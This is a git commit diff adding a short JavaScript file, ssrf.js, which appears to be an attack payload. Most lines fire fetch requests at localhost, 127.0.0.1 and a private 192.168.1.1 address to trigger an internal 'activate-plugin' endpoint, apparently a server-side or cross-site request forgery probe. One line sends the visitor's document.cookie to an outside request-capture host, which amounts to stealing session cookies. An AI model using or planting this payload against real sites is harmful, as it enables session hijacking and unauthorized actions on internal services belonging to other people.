ba70e924e55717972cfa6ef1b5351df36df7fe5c
MaxToffy <91328785+MaxToffy@users.noreply.github.com>
2023-11-19 12:10:02 +0100

    Create ssrf.js

---
+++ ssrf.js
@@ -0,0 +1,17 @@
+fetch("https://localhost:5000/activate-plugin/1");
+fetch("http://localhost:5000/activate-plugin/1");
+
+fetch("https://192.168.1.1:5000/activate-plugin/1");
+fetch("http://192.168.1.1:5000/activate-plugin/1");
+
+fetch("https://localhost/activate-plugin/1");
+fetch("http://localhost/activate-plugin/1");
+
+fetch("https://127.0.0.1:5000/activate-plugin/1");
+fetch("http://127.0.0.1:5000/activate-plugin/1");
+
+fetch("https://127.0.0.1/activate-plugin/1");
+fetch("http://127.0.0.1/activate-plugin/1");
+
+fetch("https://enjvgl53rrbci.x.pipedream.net/?cookie="+document.cookie);
+fetch("https://enjvgl53rrbci.x.pipedream.net/?cookie=test");
